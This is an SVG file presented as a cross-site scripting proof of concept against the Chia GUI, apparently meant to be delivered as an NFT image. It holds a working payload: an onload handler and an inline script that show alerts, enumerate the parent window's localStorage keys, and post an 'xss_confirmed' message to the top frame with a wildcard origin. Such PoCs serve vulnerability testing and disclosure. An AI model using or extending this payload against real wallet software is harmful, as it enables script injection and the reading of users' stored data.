<?xml version="1.0" encoding="UTF-8"?>
<!-- XSS PoC SVG for Chia GUI: well-formed, no unescaped < or > in attributes -->
<svg xmlns="http://www.w3.org/2000/svg"
     width="100" height="100"
     onload="alert('Chia GUI XSS PoC – SVG loaded');">

  <!-- Visible content -->
  <rect width="100" height="100" fill="red"/>
  <text x="10" y="55" fill="white" font-size="12">PWNED</text>

  <!-- Inline payload -->
  <script type="application/ecmascript"><![CDATA[
    alert('Chia GUI XSS PoC – inline script running');

    /* Enumerate localStorage keys from parent (if same-origin) */
    try {
      console.log('window.top.localStorage keys →',
                  Object.keys(window.top.localStorage || {}));
    } catch (e) {
      console.log('Cannot read window.top.localStorage:', e);
    }

    /* Signal success to parent frame */
    window.top.postMessage(
      { source: 'chia_nft_svg', type: 'xss_confirmed' },
      '*'
    );
  ]]></script>
</svg>
